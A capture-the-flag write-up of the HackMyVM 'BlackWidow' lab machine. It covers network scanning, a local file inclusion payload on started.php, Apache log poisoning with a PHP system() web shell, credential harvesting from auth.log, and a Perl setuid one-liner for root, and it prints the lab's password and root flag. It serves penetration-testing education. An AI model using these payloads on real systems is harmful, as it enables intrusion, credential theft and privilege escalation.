# 🕷️ HackMyVM - BlackWidow (Easy) Writeup

![Platform](https://img.shields.io/badge/Platform-HackMyVM-red)
![Difficulty](https://img.shields.io/badge/Difficulty-Easy-green)
![OS](https://img.shields.io/badge/OS-Linux-blue)
![Status](https://img.shields.io/badge/Rooted-Yes-success)

---

# 📖 Introduction

Today we are going to solve another HackMyVM machine listed as **Easy** named **BlackWidow**.

Unlike many other HackMyVM machines, this one does not reveal its IP address in the banner. Therefore, our first task is to discover the target machine on the network before beginning enumeration.

---

# 🔍 Finding The Target Machine

As the machine does not provide an IP address, we start by identifying it on the network using **netdiscover**.

![image alt](https://github.com/naval0505/HackMyVM/blob/c90ecfea1bd8fb1a6dc9e9d1e9e2dc9715dea0e2/BlackWidow%20-%20HackMyVM%20Machine/images/i1.png)

Moving forward, we will use netdiscover to locate the machine.

![image alt](https://github.com/naval0505/HackMyVM/blob/d54ea5b1629806723acb077971f3c498b3aac358/BlackWidow%20-%20HackMyVM%20Machine/images/i2.png)

For my setup, the interface was **eth1**. You should use whichever interface is connected to your lab network.

```bash
netdiscover -i eth1
```

![image alt](https://github.com/naval0505/HackMyVM/blob/d54ea5b1629806723acb077971f3c498b3aac358/BlackWidow%20-%20HackMyVM%20Machine/images/i3.png)

After running netdiscover, we identify the target machine:

```text
Main IP :: 192.168.56.119
```

---

# 🚀 Initial Enumeration

Now that we have the target IP, we begin with a full TCP port scan.

```bash
nmap -p- --min-rate 5000 192.168.56.119
```

Results:

```text
22/tcp    open  ssh
80/tcp    open  http
111/tcp   open  rpcbind
2049/tcp  open  nfs
3128/tcp  open  squid-http
38645/tcp open  unknown
42105/tcp open  unknown
42601/tcp open  unknown
55007/tcp open  unknown
```

![image alt](https://github.com/naval0505/HackMyVM/blob/d54ea5b1629806723acb077971f3c498b3aac358/BlackWidow%20-%20HackMyVM%20Machine/images/i4.png)

Several interesting services are exposed including:

* SSH
* Apache Web Server
* RPC Services
* NFS
* Squid Proxy

To gather more information, we perform service and version detection.

```bash
nmap -sCV -p22,80,111,2049,3128,38645,42105,42601,55007 192.168.56.119
```

![image alt](https://github.com/naval0505/HackMyVM/blob/d54ea5b1629806723acb077971f3c498b3aac358/BlackWidow%20-%20HackMyVM%20Machine/images/i5.png)

Important findings:

```text
OpenSSH 7.9p1
Apache 2.4.38
RPC Services
NFS Shares
Squid Proxy 4.6
```

---

# 🌐 Web Enumeration

We begin investigating port **80**.

Visiting the homepage reveals nothing except a Black Widow spider image.

![image alt](https://github.com/naval0505/HackMyVM/blob/d54ea5b1629806723acb077971f3c498b3aac358/BlackWidow%20-%20HackMyVM%20Machine/images/i6.png)

Since the homepage contains almost no useful information, we proceed with directory and file fuzzing.

```bash
feroxbuster -u http://192.168.56.119 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
```

Interesting findings:

```text
/js/
/docs/
/company/
/company/assets/
/company/forms/
/company/assets/vendor/
/company/assets/js/
/company/assets/css/
/company/assets/img/
```

![image alt](https://github.com/naval0505/HackMyVM/blob/d54ea5b1629806723acb077971f3c498b3aac358/BlackWidow%20-%20HackMyVM%20Machine/images/i7.png)

The most interesting path is:

```text
/company
```

Upon visiting the directory we discover a complete website.

Additionally, we discover a hostname:

```text
blackwidow
```

---

# 🏠 Host Configuration

To ensure proper functionality of the website we add the hostname to our hosts file.

![image alt](https://github.com/naval0505/HackMyVM/blob/d54ea5b1629806723acb077971f3c498b3aac358/BlackWidow%20-%20HackMyVM%20Machine/images/i8.png)

```bash
echo "192.168.56.119 blackwidow" >> /etc/hosts
```

After refreshing the website, the platform becomes accessible using the hostname.

---

# 📡 RPC Enumeration

Since port **111** is open, we enumerate RPC services.

```bash
rpcinfo -p 192.168.56.119
```

![image alt](https://github.com/naval0505/HackMyVM/blob/d54ea5b1629806723acb077971f3c498b3aac358/BlackWidow%20-%20HackMyVM%20Machine/images/i10.png)

The machine exposes several NFS and mount services.

While these services initially appear promising, they eventually lead nowhere and become a rabbit hole.

---

# 🔎 Continuing Enumeration

While continuing to fuzz directories and files, we also inspect the Squid proxy on port 3128.

Unfortunately:

```text
Port 3128 = Rabbit Hole
RPC Services = Rabbit Hole
```

No direct attack path was discovered through these services.

![image alt](https://github.com/naval0505/HackMyVM/blob/d54ea5b1629806723acb077971f3c498b3aac358/BlackWidow%20-%20HackMyVM%20Machine/images/i11.png)

Returning to the web application and monitoring requests through Burp Suite eventually reveals something much more interesting.

We discover the following parameter:

```text
http://blackwidow/company/started.php?file=
```

Testing Local File Inclusion payloads:

```text
http://blackwidow/company/started.php?file=../../../../../../../etc/passwd
```

The page returns blank content instead of an error.

This behavior strongly suggests a possible LFI vulnerability.

---

# 📂 LFI Fuzzing

To confirm the vulnerability, we perform file fuzzing.

![image alt](https://github.com/naval0505/HackMyVM/blob/d54ea5b1629806723acb077971f3c498b3aac358/BlackWidow%20-%20HackMyVM%20Machine/images/i12.png)

```bash
ffuf -c -u 'http://192.168.56.119/?file=FUZZ' \
-w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-Jhaddix.txt \
-fw 1
```

![image alt](https://github.com/naval0505/HackMyVM/blob/d54ea5b1629806723acb077971f3c498b3aac358/BlackWidow%20-%20HackMyVM%20Machine/images/i13.png)

After further testing and validation, the LFI vulnerability appears exploitable.

![image alt](https://github.com/naval0505/HackMyVM/blob/d54ea5b1629806723acb077971f3c498b3aac358/BlackWidow%20-%20HackMyVM%20Machine/images/i14.png)

At this point, we begin exploring methods to turn the LFI into Remote Code Execution.

---

# ☠️ Apache Log Poisoning

To obtain code execution we abuse Apache Log Poisoning.

Reference:

```text
https://www.hackingarticles.in/apache-log-poisoning-through-lfi/
```

The idea is simple:

1. Inject PHP code into Apache logs through the User-Agent header.
2. Read the log file via LFI.
3. Execute commands through the injected PHP payload.

Inject:

```php
<?php system($_GET['cmd']); ?>
```

Then access:

```text
../../../../../../../../../../../../../../../../../../../../../../var/log/apache2/access.log&cmd=id
```

Response:

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

![image alt](https://github.com/naval0505/HackMyVM/blob/d54ea5b1629806723acb077971f3c498b3aac358/BlackWidow%20-%20HackMyVM%20Machine/images/i15.png)

We now have command execution.

---

# 🐚 Obtaining A Reverse Shell

Next, we URL-encode a reverse shell payload and execute it through the poisoned Apache log.

Once triggered, we receive a shell as:

```text
www-data
```

---

# 🔧 Shell Stabilization

Python stabilization was not available in my case, so I used the classic script method.

![image alt](https://github.com/naval0505/HackMyVM/blob/d54ea5b1629806723acb077971f3c498b3aac358/BlackWidow%20-%20HackMyVM%20Machine/images/i16.png)

```bash
script -qc /bin/bash /dev/null
```

Background shell:

```bash
CTRL + Z
```

On attacker machine:

```bash
stty raw -echo; fg
```

Inside victim:

```bash
export TERM=xterm-256color
```

Shell becomes fully interactive.

---

# 🔍 Local Enumeration

Now that we have shell access, we begin looking around the machine.

One interesting location is:

```bash
cd /var/backups
ls
```

Output:

```text
alternatives.tar.0
apt.extended_states
auth.log
passwd.bak
shadow.bak
group.bak
gshadow.bak
...
```

Among these files, the most interesting one is:

```text
auth.log
```

---

# 🔑 Credential Discovery

Inspecting the authentication logs reveals credentials.

![image alt](https://github.com/naval0505/HackMyVM/blob/d54ea5b1629806723acb077971f3c498b3aac358/BlackWidow%20-%20HackMyVM%20Machine/images/i17.png)

Discovered password:

```text
?V1p3r2020!?
```

Using these credentials we successfully switch users and gain access as:

```text
viper
```

At this point we can retrieve:

```text
local.txt
```

![image alt](https://github.com/naval0505/HackMyVM/blob/d54ea5b1629806723acb077971f3c498b3aac358/BlackWidow%20-%20HackMyVM%20Machine/images/i18.png)

---

# ⬆️ Privilege Escalation

Checking sudo permissions does not immediately reveal anything useful.

```bash
sudo -l
```

No direct privilege escalation path.

Therefore, we upload and execute:

```bash
linpeas.sh
```

After reviewing the results, we discover an unusual binary.

Path:

```bash
/home/viper/backup_site/assets/vendor/weapon/arsenic
```

---

# ⚔️ Investigating The Arsenic Binary

Directory structure:

```bash
backup_site/assets/vendor/weapon/
```

Contains:

```text
arsenic
```

Running help:

```bash
./arsenic -h
```

![image alt](https://github.com/naval0505/HackMyVM/blob/d54ea5b1629806723acb077971f3c498b3aac358/BlackWidow%20-%20HackMyVM%20Machine/images/i19.png)

The output reveals something very interesting.

The binary behaves similarly to a Perl interpreter.

Because of the way it is configured, it can be abused to execute commands as root.

---

# 👑 Root Exploitation

Execute:

```bash
/home/viper/backup_site/assets/vendor/weapon/arsenic \
-e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";'
```

Result:

```text
root@blackwidow
```

Successful privilege escalation.

---

# 🏁 Root Flag

Navigate to root directory and read:

```bash
cat /root/root.txt
```

![image alt](https://github.com/naval0505/HackMyVM/blob/d54ea5b1629806723acb077971f3c498b3aac358/BlackWidow%20-%20HackMyVM%20Machine/images/i20.png)

Root flag:

```text
0780eb289a44ba17ea499ffa6322b335
```

---

# 🎯 Attack Path Summary

```text
Port Scan
    ↓
Web Enumeration
    ↓
/company Discovered
    ↓
Hostname Discovery
    ↓
LFI Found
    ↓
Apache Log Poisoning
    ↓
RCE
    ↓
www-data Shell
    ↓
Auth Log Enumeration
    ↓
Credentials Found
    ↓
viper User
    ↓
LinPEAS
    ↓
Arsenic Binary Abuse
    ↓
Root Shell
```

---

# 🧠 Lessons Learned

### Enumeration Matters

The machine initially presents several services that appear interesting:

* NFS
* RPC
* Squid Proxy

However, these become distractions.

### Never Ignore Small Parameters

The vulnerable parameter:

```text
started.php?file=
```

Looked insignificant but ultimately led to complete compromise.

### LFI Can Become RCE

Through Apache Log Poisoning we transformed:

```text
LFI → Command Execution → Reverse Shell
```

### Always Check Custom Binaries

The final privilege escalation relied on an unusual binary:

```text
arsenic
```

Custom binaries frequently provide escalation opportunities.

---

# ✅ Machine Rooted

```text
User  : Obtained
Root  : Obtained
Method: LFI → Apache Log Poisoning → Credential Harvesting → Custom Binary Abuse
```

**BlackWidow successfully compromised and rooted.**
